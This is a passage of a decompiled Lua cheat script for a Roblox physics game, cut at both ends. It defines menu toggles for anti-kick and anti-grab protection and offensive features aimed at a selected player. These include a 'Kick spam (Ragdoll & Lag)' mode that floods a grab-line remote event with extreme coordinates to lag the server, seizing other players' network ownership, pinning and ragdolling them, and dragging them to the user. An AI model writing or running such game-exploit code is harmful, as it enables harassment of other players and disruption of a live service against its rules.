                                    if not ninjaShuriken or not ninjaShuriken:FindFirstChild("StickyPart") or localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid") and localPlayer.Character.Humanoid.Health <= 0 or not ninjaShuriken.StickyPart:FindFirstChild("StickyWeld") or not ninjaShuriken.StickyPart.StickyWeld.Part1 then
                                        local v88 = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")

                                        if v88 and DestroyToy then
                                            for k, child in pairs(v88:GetChildren()) do
                                                if child.Name == "AntiKick" or child.Name == "NinjaShuriken" then
                                                    pcall(function()
                                                        DestroyToy:FireServer(child)
                                                    end)
                                                end
                                            end
                                        end
                                    end
                                end)

                                n2 = 1
                            elseif n2 == 81 then
                                task.wait(0.1)
                                n2 = 47
                            elseif n2 == 82 then
                                task.wait(0.1)
                                n2 = 21
                            elseif n2 == 83 then
                                return
                            end
                        end
                    end)
                else
                    tbl2.AntikickT = false
                    local v46 = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")

                    if v46 and DestroyToy then
                        for k, child in pairs(v46:GetChildren()) do
                            if child.Name == "AntiKick" or child.Name == "NinjaShuriken" then
                                pcall(function()
                                    DestroyToy:FireServer(child)
                                end)
                            end
                        end
                    end
                end
            end,
        })

        v16:AddToggle("AntikickPenc", {
            Text = "Anti-Kick (Pencil ✏)",
            Default = false,
            Callback = function(tinko)
                tbl2.Tinko = tinko

                if tbl2.Tinko then
                    while tbl2.Tinko do
                        local v46 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")

                        while tbl2.Tinko and v46 and not v46:FindFirstChild("PencilDDD") do
                            if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                local tbl11 = {}

                                for k, child in pairs(v46:GetChildren()) do
                                    tbl11[child] = true
                                end

                                fn4("ToolPencil", CFrame.new(localPlayer.Character.HumanoidRootPart.CFrame.Position) + Vector3.new(0, 0, 15), Vector3.new(0, 0, 0))
                                local v47 = nil
                                local now2 = tick()

                                repeat
                                    for k, child in pairs(v46:GetChildren()) do
                                        if not tbl11[child] and child.Name == "ToolPencil" then
                                            v47 = child
                                            break
                                        end
                                    end

                                    task.wait()
                                until v47 or tick() - now2 > 2 or not tbl2.Tinko

                                if v47 then
                                    v47.Name = "PencilDDD"
                                end
                            end

                            task.wait()
                        end

                        if localPlayer.Character and localPlayer.Character:FindFirstChild("Torso") and localPlayer.Character:FindFirstChild("HumanoidRootPart") and v46 and v46:FindFirstChild("PencilDDD") then
                            local pencilDDD = v46.PencilDDD

                            if pencilDDD:FindFirstChild("StickyPart") and pencilDDD.StickyPart:FindFirstChild("StickyWeld") and pencilDDD.StickyPart.StickyWeld.Part1 ~= localPlayer.Character.Torso then
                                local position = pencilDDD.SoundPart.CFrame.Position
                                local position2 = localPlayer.Character.HumanoidRootPart.CFrame.Position
                                local vector = Vector3.new((position.X - position2.X) ^ 2, (position.Y - position2.Y) ^ 2, (position.Z - position2.Z) ^ 2)

                                if math.sqrt(vector.X + vector.Y + vector.Z) > 20 then
                                    DestroyToy:FireServer(pencilDDD)
                                else
                                    StickyPartEvent:FireServer(pencilDDD.StickyPart, localPlayer.Character.Torso, CFrame.new(0, -1, 0) * CFrame.Angles(0, math.pi, 0))

                                    for k, child in pairs(pencilDDD:GetChildren()) do
                                        if child.ClassName == "Part" then
                                            child.CanQuery = false
                                        end
                                    end

                                    task.wait(0.2)

                                    if localPlayer.Character and localPlayer.Character:FindFirstChild("Torso") and localPlayer.Character:FindFirstChild("HumanoidRootPart") and v46:FindFirstChild("PencilDDD") and pencilDDD:FindFirstChild("StickyPart") and pencilDDD.StickyPart:FindFirstChild("StickyWeld") and pencilDDD.StickyPart.StickyWeld.Part1 ~= localPlayer.Character.Torso and v46:FindFirstChild("PencilDDD") and pencilDDD.StickyPart.StickyWeld.Part1 ~= localPlayer.Character.Torso then
                                        SetNetworkOwner:FireServer(pencilDDD.SoundPart, pencilDDD.SoundPart.CFrame)
                                    end
                                end
                            end
                        end

                        task.wait()
                    end
                else
                    local v46 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")

                    if v46 then
                        local pencilDDD = v46:FindFirstChild("PencilDDD")

                        if pencilDDD then
                            DestroyToy:FireServer(pencilDDD)
                        end
                    end
                end
            end,
        })

        v16:AddToggle("Antireset", {
            Text = "Auto-Reset",
            Default = true,
            Callback = function(antikickResetToggle)
                local v46 = nil
                tbl2.AntikickResetToggle = antikickResetToggle

                if tbl2.AntikickResetToggle then
                    tbl2.Contuuti.GameNotify = GameCorrectionsNotify.OnClientEvent:Connect(function(arg)
                        if arg == "Flying" then
                            Struggle:FireServer(localPlayer)
                            local v47 = getCharacter()
                            local humanoid = v47:FindFirstChild("Humanoid")
                            local humanoid2 = humanoid or v47:WaitForChild("Humanoid", nil)

                            if humanoid2 then
                                humanoid2.Health = 0
                            end
                        end
                    end)
                else
                    local contuuti = tbl2.Contuuti

                    while true do
                        local v47, v48 = contuuti(nil, v46)
                        if v47 == nil then
                            break
                        end
                        v46 = v47

                        if v47:find("GameNotify") then
                            v48:Disconnect()
                        end
                    end
                end
            end,
        })

        v16:AddToggle("Antileave", {
            Text = "Auto-Leave",
            Default = false,
            Callback = function(antikickLeaveToggle)
                local v46 = nil
                tbl2.AntikickLeaveToggle = antikickLeaveToggle

                if tbl2.AntikickLeaveToggle then
                    tbl2.Contuuti.GameLeaveNotify = GameCorrectionsNotify.OnClientEvent:Connect(function(arg)
                        if arg == "Flying" then
                            localPlayer:Kick("Disconnected to prevent ban. [by: Vortex]")
                        end
                    end)
                else
                    local contuuti = tbl2.Contuuti

                    while true do
                        local v47, v48 = contuuti(nil, v46)
                        if v47 == nil then
                            break
                        end
                        v46 = v47

                        if v47:find("GameLeaveNotify") then
                            v48:Disconnect()
                        end
                    end
                end
            end,
        })

        v16:AddToggle("AntiEnable", {
            Text = "Auto-Enable",
            Default = true,
            Callback = function(autoTurnOnAntiKick)
                tbl2.AutoTurnOnAntiKick = autoTurnOnAntiKick

                if tbl2.AutoTurnOnAntiKick then
                    tbl2.Contuuti.AntiKickAutoOn = GameCorrectionsNotify.OnClientEvent:Connect(function(arg)
                        if arg == "Flying" and not tbl2.antikick and tbl2.AntiKickToggle then
                            tbl2.AntiKickToggle:Set(true)
                        end
                    end)
                elseif tbl2.Contuuti.AntiKickAutoOn then
                    tbl2.Contuuti.AntiKickAutoOn:Disconnect()
                    tbl2.Contuuti.AntiKickAutoOn = nil
                end
            end,
        })

        fn21 = function()
            task.spawn(function()
                local v46, v47, v48, v49, v50, v51, v52, v53, v54, v55, humanoidRootPart, head_, partOwner_, v56, v57, n2, n3, partOwner_2, flag, partOwner_3
                local flag2, n4
                n4 = 1

                while true do
                    if n4 == 1 then
                        if tbl2.TargetAntigrabtpT then
                            n4 = 2
                        else
                            n4 = 29
                        end
                    elseif n4 == 2 then
                        v46 = hrp_()
                        obj.RunService.RenderStepped:Wait()

                        if #tbl2.PlayerListAnti == 0 then
                            n4 = 1
                        else
                            n4 = 3
                        end
                    elseif n4 == 3 then
                        v47, v48, v49 = ipairs(tbl2.PlayerListAnti)
                        v50 = v49
                        v51 = v47
                        v52 = v48
                        n4 = 4
                    elseif n4 == 4 then
                        v53, v54 = v51(v52, v50)

                        if v53 == nil then
                            n4 = 1
                        else
                            n4 = 5
                        end
                    elseif n4 == 5 then
                        v50 = v53
                        v55 = obj.Players:FindFirstChild(v54)
                        target = v55

                        if target and target.Character then
                            n4 = 6
                        else
                            n4 = 4
                        end
                    elseif n4 == 6 then
                        char = target.Character
                        humanoidRootPart = char:FindFirstChild("HumanoidRootPart")
                        hrp = humanoidRootPart
                        head_ = char:FindFirstChild("Head")
                        head = head_

                        if hrp and head then
                            n4 = 7
                        else
                            n4 = 4
                        end
                    elseif n4 == 7 then
                        partOwner_ = head:FindFirstChild("PartOwner")
                        partOwner = partOwner_

                        if partOwner and partOwner.Value ~= "" and partOwner.Value ~= localPlayer.Name then
                            n4 = 8
                        else
                            n4 = 4
                        end
                    elseif n4 == 8 then
                        distance = (hrp.Position - v46.Position).Magnitude

                        if distance <= 30 then
                            n4 = 21
                        else
                            n4 = 9
                        end
                    elseif n4 == 9 then
                        saved = v46.CFrame
                        v46.CFrame = hrp.CFrame * CFrame.new(0, 0, 2)
                        task.wait(0.05)
                        v56 = v51
                        v57 = v52
                        n2 = 0
                        n4 = 10
                    elseif n4 == 10 then
                        n3 = n2 + 1

                        if n3 <= 15 then
                            n4 = 20
                        else
                            n4 = 11
                        end
                    elseif n4 == 11 then
                        v50 = v53
                        v51 = v56
                        v52 = v57
                        partOwner_2 = head:FindFirstChild("PartOwner")
                        flag = partOwner_2

                        if partOwner_2 then
                            n4 = 12
                        else
                            n4 = 15
                        end
                    elseif n4 == 12 then
                        if head.PartOwner.Value == localPlayer.Name then
                            n4 = 14
                        else
                            n4 = 13
                        end
                    elseif n4 == 13 then
                        flag = false
                        n4 = 15
                    elseif n4 == 14 then
                        flag = true
                        n4 = 15
                    elseif n4 == 15 then
                        weOwnIt = flag

                        if weOwnIt then
                            n4 = 16
                        else
                            n4 = 19
                        end
                    elseif n4 == 16 then
                        if tbl2.tpmode == "Bring" then
                            n4 = 17
                        else
                            n4 = 18
                        end
                    elseif n4 == 17 then
                        hrp.CFrame = saved * CFrame.new(0, 5, 0)
                        hrp.AssemblyLinearVelocity = Vector3.zero
                        hrp.AssemblyAngularVelocity = Vector3.zero
                        task.wait(0.05)
                        n4 = 18
                    elseif n4 == 18 then
                        pcall(function()
                            DestroyGrabLine:FireServer(hrp)
                        end)

                        n4 = 19
                    elseif n4 == 19 then
                        v46.CFrame = saved
                        v46.AssemblyLinearVelocity = Vector3.zero
                        v46.AssemblyAngularVelocity = Vector3.zero
                        n4 = 4
                    elseif n4 == 20 then
                        n2 = n3

                        pcall(function()
                            SetNetworkOwner:FireServer(hrp, hrp.CFrame)
                            CreateGrabLine:FireServer(hrp, Vector3.zero, hrp.Position, false)
                        end)

                        task.wait(0.01)
                        n4 = 10
                    elseif n4 == 21 then
                        pcall(function()
                            SetNetworkOwner:FireServer(hrp, hrp.CFrame)
                            CreateGrabLine:FireServer(hrp, Vector3.zero, hrp.Position, false)
                        end)

                        partOwner_3 = head:FindFirstChild("PartOwner")
                        flag2 = partOwner_3

                        if partOwner_3 then
                            n4 = 22
                        else
                            n4 = 25
                        end
                    elseif n4 == 22 then
                        if head.PartOwner.Value == localPlayer.Name then
                            n4 = 24
                        else
                            n4 = 23
                        end
                    elseif n4 == 23 then
                        flag2 = false
                        n4 = 25
                    elseif n4 == 24 then
                        flag2 = true
                        n4 = 25
                    elseif n4 == 25 then
                        weOwnIt = flag2

                        if weOwnIt then
                            n4 = 26
                        else
                            n4 = 4
                        end
                    elseif n4 == 26 then
                        if tbl2.tpmode == "Bring" then
                            n4 = 27
                        else
                            n4 = 28
                        end
                    elseif n4 == 27 then
                        hrp.CFrame = v46.CFrame * CFrame.new(0, 5, 0)
                        hrp.AssemblyLinearVelocity = Vector3.zero
                        hrp.AssemblyAngularVelocity = Vector3.zero
                        n4 = 28
                    elseif n4 == 28 then
                        pcall(function()
                            DestroyGrabLine:FireServer(hrp)
                        end)

                        n4 = 4
                    elseif n4 == 29 then
                        return
                    end
                end
            end)
        end

        v15:AddPlayersDropdown("TargetSelect1", {
            Text = "Select Target",
            Multi = false,
            ExcludeLocalPlayer = true,
            Searchable = false,
            EnablePlayerImages = true,
            Callback = function(arg)
                if arg then
                    tbl2.PlayerListAnti = {arg.Name}
                else
                    tbl2.PlayerListAnti = {}
                end
            end,
        })

        v15:AddDropdown("Config.tpmode", {
            Text = "Method",
            Values = {"Grab", "Bring"},
            Default = "Grab",
            Callback = function(tpmode)
                tbl2.tpmode = tpmode
            end,
        })

        v15:AddToggle("TPPEnabled", {
            Text = "Anti-Grab",
            Default = false,
            Callback = function(targetAntigrabtpT)
                tbl2.TargetAntigrabtpT = targetAntigrabtpT

                if targetAntigrabtpT then
                    fn21()
                end
            end,
        })

        v15:AddToggle("TPPAntiKick", {
            Text = "Anti-Kick",
            Default = false,
            Callback = function(arg)
                if not arg then
                    for i, v46 in ipairs(tbl2.PlayerListAnti) do
                        local v47 = obj.Players:FindFirstChild(v46)
                        target = v47

                        if target then
                            local v48 = obj.Workspace:FindFirstChild(target.Name .. "SpawnedInToys")
                            targetInv = v48

                            if targetInv and targetInv:FindFirstChild("TPPShuriken_" .. v46) then
                                pcall(function()
                                    DestroyToy:FireServer(targetInv["TPPShuriken_" .. v46])
                                end)
                            end
                        end
                    end

                    return
                end

                task.spawn(function()
                    local v46, v47, v48, v49, v50, v51, v52, v53, v54, v55, v56, v57, n2
                    n2 = 1

                    while true do
                        if n2 == 1 then
                            shurikens = {}
                            setupDone = {}
                            n2 = 2
                        elseif n2 == 2 then
                            if toggles.TPPAntiKick.Value then
                                n2 = 3
                            else
                                n2 = 7
                            end
                        elseif n2 == 3 then
                            obj.RunService.RenderStepped:Wait()

                            if #tbl2.PlayerListAnti == 0 then
                                n2 = 2
                            else
                                n2 = 4
                            end
                        elseif n2 == 4 then
                            v46, v47, v48 = ipairs(tbl2.PlayerListAnti)
                            v49 = v48
                            n2 = 5
                        elseif n2 == 5 then
                            v50, v51 = v46(v47, v49)

                            if v50 == nil then
                                n2 = 2
                            else
                                n2 = 6
                            end
                        elseif n2 == 6 then
                            v49 = v50

                            pcall(function()
                                local v58 = obj.Players:FindFirstChild(v51)
                                target = v58

                                if target and target.Character then
                                    targetChar = target.Character
                                    local humanoidRootPart = targetChar:FindFirstChild("HumanoidRootPart")
                                    targetHRP = humanoidRootPart
                                    local v59 = targetHRP
                                    local firePlayerPart = v59 and targetHRP:FindFirstChild("FirePlayerPart")
                                    targetFirePart = firePlayerPart
                                    if not targetHRP or not targetFirePart then
                                        return
                                    end
                                    myChar = localPlayer.Character
                                    local v60 = myChar
                                    local humanoidRootPart2 = v60 and myChar:FindFirstChild("HumanoidRootPart")
                                    myHRP = humanoidRootPart2

                                    if myHRP then
                                        dist = (targetHRP.Position - myHRP.Position).Magnitude
                                        if dist > 30 then
                                            setupDone[v51] = false
                                            return
                                        end
                                    end

                                    local v61 = obj.Workspace:FindFirstChild(target.Name .. "SpawnedInToys")
                                    targetInv = v61
                                    if not targetInv then
                                        return
                                    end
                                    shuName = "TPPShuriken_" .. v51
                                    shuData = shurikens[v51]
                                    local v62 = shuData
                                    local toy = v62 and shuData.toy
                                    shu = toy
                                    local v63 = shuData
                                    local part_ = v63 and shuData.part
                                    part = part_
                                    local v64 = shu
                                    local flag = v64 and shu.Parent ~= nil
                                    shuExists = flag
                                    local v65 = part
                                    local flag2 = v65 and part.Parent ~= nil
                                    partExists = flag2

                                    if setupDone[v51] and (not shuExists or not partExists) then
                                        setupDone[v51] = false
                                        shurikens[v51] = nil
                                    end

                                    if not setupDone[v51] then
                                        if not target.CanSpawnToy or not target.CanSpawnToy.Value then
                                            return
                                        end

                                        local NinjaShuriken = (function(arg2, arg3)
                                            if not localPlayer.CanSpawnToy.Value then
                                                localPlayer.CanSpawnToy.Changed:Wait()
                                            end

                                            local v66 = nil
                                            local connection2 = nil
                                            v8 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")

                                            connection2 = v8.ChildAdded:Connect(function(child)
                                                if child.Name == arg2 then
                                                    v66 = child
                                                    connection2:Disconnect()
                                                end
                                            end)

                                            task.spawn(function()
                                                SpawnToyRemoteFunction:InvokeServer(arg2, arg3, Vector3.new(0, 0, 0))
                                            end)

                                            local n3 = tick() + 1
                                            time = n3
                                            local now2

                                            repeat
                                                task.wait()
                                                if v66 then
                                                    break
                                                end
                                                now2 = tick()
                                            until time < now2

                                            if not v66 then
                                                return nil
                                            end
                                            return v66
                                        end)("NinjaShuriken", targetHRP.CFrame * CFrame.new(5, 10, 20))

                                        shu = NinjaShuriken
                                        if not shu then
                                            return
                                        end
                                        shu.Name = shuName
                                        local stickyPart = shu:WaitForChild("StickyPart", 0.5)
                                        part = stickyPart
                                        if not part then
                                            return
                                        end
                                        SetNetworkOwner:FireServer(part, part.CFrame)
                                        task.wait(0.1)
                                        StickyPartEvent:FireServer(part, targetFirePart, CFrame.new(0, 0, 0, 1, 0, 0, 0, 0, -1, 0, 1, 0))
                                        shurikens[v51] = {toy = shu, part = part}
                                        setupDone[v51] = true
                                    end

                                    if part and part:FindFirstChild("PartOwner") and part.PartOwner.Value ~= localPlayer.Name then
                                        SetNetworkOwner:FireServer(part, part.CFrame)
                                    end

                                    for i, child in ipairs(targetInv:GetChildren()) do
                                        if child:FindFirstChild("StickyPart") then
                                            sp = child.StickyPart
                                            local partOwner_ = sp:FindFirstChild("PartOwner")
                                            po = partOwner_
                                            local stickyWeld = sp:FindFirstChild("StickyWeld")
                                            sw = stickyWeld

                                            if po and po.Value ~= "" and po.Value ~= target.Name then
                                                SetNetworkOwner:FireServer(sp, sp.CFrame)
                                                task.wait()

                                                if po.Value == localPlayer.Name then
                                                    sp.CFrame = CFrame.new(0, (0 / 0), 0)
                                                end
                                            end

                                            if sw and sw.Part1 then
                                                weldParent = sw.Part1.Parent

                                                if weldParent and weldParent ~= targetChar then
                                                    SetNetworkOwner:FireServer(sp, sp.CFrame)
                                                    task.wait()

                                                    if po and po.Value == localPlayer.Name then
                                                        sp.CFrame = CFrame.new(0, (0 / 0), 0)
                                                    end
                                                end
                                            end
                                        end
                                    end

                                    return
                                end

                                setupDone[v51] = false
                            end)

                            n2 = 5
                        elseif n2 == 7 then
                            v52, v53, v54 = pairs(shurikens)
                            v55 = v54
                            n2 = 8
                        elseif n2 == 8 then
                            v56, v57 = v52(v53, v55)

                            if v56 == nil then
                                n2 = 10
                            else
                                n2 = 9
                            end
                        elseif n2 == 9 then
                            v55 = v56

                            pcall(function()
                                if v57.toy then
                                    DestroyToy:FireServer(v57.toy)
                                end
                            end)

                            n2 = 8
                        elseif n2 == 10 then
                            shurikens = {}
                            setupDone = {}
                            return
                        end
                    end
                end)
            end,
        })

        v17:AddPlayersDropdown("TargetSelect", {
            Text = "Select Target",
            Multi = false,
            ExcludeLocalPlayer = true,
            Searchable = false,
            EnablePlayerImages = true,
            Callback = function(arg)
                if arg then
                    tbl2.PlayerList = {arg.Name}
                else
                    tbl2.PlayerList = {}
                end
            end,
        })

        OwnerShip:AddToggle("KickspamRag", {
            Text = "Kick spam (Ragdoll & Lag)",
            Default = false,
            Callback = function(aa6)
                tbl2.aa6 = aa6
                tbl2.aa13 = aa6

                if aa6 and (not tbl2.PlayerList or #tbl2.PlayerList == 0) then
                    task.spawn(function()
                        toggles.KickspamRag:SetValue(false)
                    end)

                    return
                end

                local function fn40(arg, arg2, arg3)
                    local v46 = arg:FindFirstChild(arg2)
                    local v47 = v46

                    if not v46 then
                        local waitForChild = arg.WaitForChild
                        local n2 = arg3 or 5
                        v47 = waitForChild(arg, arg2, n2)
                    end

                    return v47
                end

                local function fn41(arg)
                    if arg and arg:IsA("BasePart") then
                        SetNetworkOwner:FireServer(arg, arg.CFrame)
                        task.wait()
                    end
                end

                local function fn42(arg, arg2)
                    local flag = arg:FindFirstChild(arg2) ~= nil
                    return flag
                end

                local function fn43(arg)
                    local humanoidRootPart = getCharacter():WaitForChild("HumanoidRootPart")
                    local n2 = 0

                    while localPlayer.InPlot.Value and not localPlayer.InOwnedPlot.Value and n2 < 50 do
                        task.wait(0.1)
                        n2 = n2 + 1
                    end

                    local n3 = 0

                    while not localPlayer.CanSpawnToy.Value and n3 < 50 do
                        task.wait(0.1)
                        n3 = n3 + 1
                    end

                    local n4 = humanoidRootPart.CFrame * CFrame.new(0, 14, 20)
                    local v46 = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                    local plot1 = v46

                    if not v46 then
                        local plotItems2 = workspace:FindFirstChild("PlotItems")
                        plot1 = plotItems2 and plotItems2:FindFirstChild("Plot1")
                    end

                    if not plot1 then
                        plot1 = workspace
                    end

                    local v47 = nil

                    local connection2 = plot1.ChildAdded:Connect(function(child)
                        if child.Name == arg then
                            v47 = child
                        end
                    end)

                    task.spawn(function()
                        pcall(function()
                            fn4(arg, n4, Vector3.zero)
                        end)
                    end)

                    local now2 = tick()

                    repeat
                        task.wait(0.05)
                    until v47 or tick() - now2 > 5

                    connection2:Disconnect()
                    return v47
                end

                local function fn44()
                    if tbl2.aa17 then
                        return nil
                    end
                    tbl2.aa17 = true
                    local PalletLightBrown = fn43("PalletLightBrown")
                    if not PalletLightBrown then
                        tbl2.aa17 = false
                        return nil
                    end
                    local soundPart = fn40(PalletLightBrown, "SoundPart", 3)

                    if not soundPart then
                        PalletLightBrown:Destroy()
                        tbl2.aa17 = false
                        return nil
                    end

                    local n2 = 0

                    while n2 < 10 do
                        if not tbl2.aa13 then
                            PalletLightBrown:Destroy()
                            tbl2.aa17 = false
                            return nil
                        end

                        fn41(soundPart)
                        task.wait()
                        if fn42(soundPart, "PartOwner") then
                            break
                        end
                        n2 = n2 + 1
                    end

                    if not fn42(soundPart, "PartOwner") then
                        PalletLightBrown:Destroy()
                        tbl2.aa17 = false
                        return nil
                    end

                    for k, descendant in pairs(PalletLightBrown:GetDescendants()) do
                        if descendant:IsA("BasePart") then
                            descendant.CanCollide = false
                            descendant.Transparency = 0.8
                        end
                    end

                    PalletLightBrown.Name = "RagdollPalete"
                    local bodyVelocity = Instance.new("BodyVelocity")
                    bodyVelocity.MaxForce = Vector3.new(0, math.huge, 0)
                    bodyVelocity.Velocity = Vector3.new(0, 900, 0)
                    bodyVelocity.Parent = soundPart
                    tbl2.aa17 = false
                    return PalletLightBrown
                end

                local function fn45(arg, arg2)
                    if not arg.Character then
                        return
                    end
                    local humanoidRootPart = arg.Character:FindFirstChild("HumanoidRootPart")
                    if not humanoidRootPart or not arg2 then
                        return
                    end
                    local cFrame = arg2.CFrame
                    arg2.CFrame = humanoidRootPart.CFrame * CFrame.new(0, 0, 2)

                    for i = 1, 15 do
                        SetNetworkOwner:FireServer(humanoidRootPart, humanoidRootPart.CFrame)
                        task.wait()
                    end

                    arg2.CFrame = cFrame
                end

                local function fn46()
                    if tbl2.running then
                        return
                    end

                    if not tbl2.PlayerList or #tbl2.PlayerList == 0 then
                        return
                    end

                    if not CreateGrabLine then
                        local createGrabLine2 = Events.GrabEvents:WaitForChild("CreateGrabLine", 3)
                        CreateGrabLine = createGrabLine2
                        if not CreateGrabLine then
                            return
                        end
                    end

                    tbl2.running = true

                    task.spawn(function()
                        while tbl2.running do
                            local spawnLocation = obj.Workspace:FindFirstChild("SpawnLocation")
                            local spawn = spawnLocation or obj.Workspace:FindFirstChild("Spawn")

                            if not spawn then
                                local character = localPlayer.Character
                                spawn = character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
                            end

                            if spawn then
                                CreateGrabLine:FireServer(spawn, CFrame.new(math.random(-2010000000, 2000000001), 0, math.random(-2008100000, 2000200000)))
                            end

                            task.wait(0.001)
                        end
                    end)
                end

                local function fn47()
                    if not tbl2.running then
                        return
                    end
                    tbl2.running = false
                end

                if aa6 then
                    if not tbl2.PlayerList or #tbl2.PlayerList == 0 then
                        return
                    end
                    task.wait(0.5)

                    task.defer(function()
                        fn46()
                    end)
                else
                    fn47()
                end

                if tbl2.aa6 then
                    task.spawn(function()
                        while tbl2.aa6 do
                            local playerList = type(tbl2.PlayerList) == "table" and tbl2.PlayerList

                            if not playerList then
                                local tbl11 = {}
                                playerList = tbl11
                                tbl11[1] = tbl2.PlayerList
                            end

                            for i, v46 in ipairs(playerList) do
                                local v47 = obj.Players:FindFirstChild(v46)
                                local character = localPlayer.Character
                                local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

                                if v47 and humanoidRootPart then
                                    local character2 = v47.Character
                                    local humanoidRootPart2 = character2 and character2:FindFirstChild("HumanoidRootPart")

                                    if humanoidRootPart2 then
                                        if tbl2.aa9 < (humanoidRootPart.Position - humanoidRootPart2.Position).Magnitude then
                                            fn45(v47, humanoidRootPart)
                                        end

                                        SetNetworkOwner:FireServer(humanoidRootPart2, humanoidRootPart2.CFrame)

                                        if DestroyGrabLine then
                                            DestroyGrabLine:FireServer(humanoidRootPart2)
                                        end

                                        humanoidRootPart2.AssemblyLinearVelocity = Vector3.zero
                                        humanoidRootPart2.AssemblyAngularVelocity = Vector3.zero
                                        local controlBP = humanoidRootPart2:FindFirstChild("ControlBP")
                                        local v48 = controlBP

                                        if not controlBP then
                                            local bodyPosition = Instance.new("BodyPosition")
                                            v48 = bodyPosition
                                            bodyPosition.Name = "ControlBP"
                                            bodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                            bodyPosition.P = 800000
                                            bodyPosition.Parent = humanoidRootPart2
                                        end

                                        v48.Position = humanoidRootPart.Position + Vector3.new(0, 15, 0)
                                    end
                                end
                            end

                            task.wait(0.001)
                        end

                        local playerList = type(tbl2.PlayerList) == "table" and tbl2.PlayerList

                        if not playerList then
                            local tbl11 = {}
                            playerList = tbl11
                            tbl11[1] = tbl2.PlayerList
                        end

                        for i, v46 in ipairs(playerList) do
                            local v47 = obj.Players:FindFirstChild(v46)

                            if v47 and v47.Character then
                                local humanoidRootPart = v47.Character:FindFirstChild("HumanoidRootPart")

                                if humanoidRootPart and humanoidRootPart:FindFirstChild("ControlBP") then
                                    humanoidRootPart.ControlBP:Destroy()
                                end
                            end
                        end
                    end)
                end

                if aa6 then
                    local v46 = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                    local v47 = nil

                    tbl2.aa73 = obj.RunService.RenderStepped:Connect(function()
                        if not tbl2.aa13 then
                            return
                        end

                        if not tbl2.PlayerList or #tbl2.PlayerList == 0 then
                            return
                        end
                        local playerList = type(tbl2.PlayerList) == "table" and tbl2.PlayerList

                        if not playerList then
                            local tbl11 = {}
                            playerList = tbl11
                            tbl11[1] = tbl2.PlayerList
                        end

                        local v48 = playerList[1]
                        if not v48 then
                            return
                        end
                        local v49 = obj.Players:FindFirstChild(v48)
                        if not v49 or not v49.Character then
                            return
                        end
                        local humanoidRootPart = v49.Character:FindFirstChild("HumanoidRootPart")
                        local humanoid = v49.Character:FindFirstChild("Humanoid")
                        if not humanoidRootPart or not humanoid then
                            return
                        end

                        if v47 and v47:IsDescendantOf(workspace) then
                            local soundPart = v47:FindFirstChild("SoundPart")

                            if soundPart then
                                if not fn42(soundPart, "PartOwner") then
                                    v47:Destroy()
                                    v47 = nil
                                end
                            else
                                v47:Destroy()
                                v47 = nil
                            end
                        end

                        if not tbl2.aa17 and (not v47 or not v47:IsDescendantOf(workspace)) then
                            local ragdollPalete = v46 and v46:FindFirstChild("RagdollPalete") or fn44()
                            v47 = ragdollPalete
                        end

                        if v47 and v47:FindFirstChild("SoundPart") then
                            local ragdolled = humanoid:FindFirstChild("Ragdolled")

                            if ragdolled and not ragdolled.Value then
                                v47.SoundPart.Position = humanoidRootPart.Position
                            end
                        end
                    end)
                elseif tbl2.aa73 then
                    tbl2.aa73:Disconnect()
                    tbl2.aa73 = nil
                end
            end,
        })

        Bring:AddDropdown("Bringmode", {
            Text = "Bring Method",
            Values = {"GRAB", "BLOBMAN"},
            Default = "GRAB",
            Callback = function(bringMode)
                tbl2.BringMode = bringMode
            end,
        })

        fn22 = function()
            local v46 = SpawnedInToys
            local creatureBlobman = v46 and v46:FindFirstChild("CreatureBlobman")

            if not creatureBlobman then
                for i, child in ipairs(PlotItems:GetChildren()) do
                    local creatureBlobman2 = child:FindFirstChild("CreatureBlobman")
                    if creatureBlobman2 and creatureBlobman2:FindFirstChild("PlayerValue") and creatureBlobman2.PlayerValue.Value == localPlayer.Name then
                        creatureBlobman = creatureBlobman2
                        break
                    end
                end
            end

            return creatureBlobman
        end

        fn23 = function()
            local v46 = getCharacter()
            local v47 = obj.Workspace:WaitForChild(localPlayer.Name .. "SpawnedInToys")
            local creatureBlobman = v47:FindFirstChild("CreatureBlobman")
            if creatureBlobman then
                return creatureBlobman
            end

            task.spawn(function()
                pcall(function()
                    fn4("CreatureBlobman", v46.Head.CFrame, Vector3.new(0, 0, 0))
                end)
            end)

            local v48 = nil

            for i = 1, 50 do
                local creatureBlobman2 = v47:FindFirstChild("CreatureBlobman")
                v48 = creatureBlobman2
                if creatureBlobman2 then
                    break
                end
                task.wait(0.05)
            end

            return v48
        end

        fn24 = function(arg)
            local v46 = arg
            local character = localPlayer.Character
            if not character then
                return
            end
            local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
            local humanoid = character:FindFirstChild("Humanoid")
            if not humanoidRootPart or not humanoid then
                return
            end

            if not arg then
                fn23()
                v46 = fn22()
            end

            if v46 then
                local vehicleSeat = v46:FindFirstChildOfClass("VehicleSeat")
                local vehicleSeat2 = vehicleSeat or v46:FindFirstChild("VehicleSeat")

                if vehicleSeat2 and humanoid.SeatPart ~= vehicleSeat2 then
                    vehicleSeat2:Sit(humanoid)
                end
            end
        end

        Bring:AddButton({
            Text = "Bring",
            Func = function()
                local playerList = tbl2.PlayerList
                local flag = type(playerList) == "table" and #playerList == 0
                local flag2 = type(playerList) == "string" and (playerList == "" or playerList == nil)
                if not playerList or flag or flag2 then
                    return
                end
                local flag3 = type(playerList) == "table" and playerList

                if not flag3 then
                    local tbl11 = {}
                    flag3 = tbl11
                    tbl11[1] = playerList
                end

                local tbl11 = {}

                for i, v46 in ipairs(flag3) do
                    local v47 = obj.Players:FindFirstChild(v46)

                    if v47 and v47.Character then
                        table.insert(tbl11, v47)
                    end
                end

                if #tbl11 == 0 then
                    return
                end
                local bringMode = tbl2.BringMode
                local str2 = bringMode or "GRAB"
                local currentCamera = workspace.CurrentCamera
                local cFrame = currentCamera.CFrame
                local cameraType = currentCamera.CameraType
                local v46 = getCharacter()
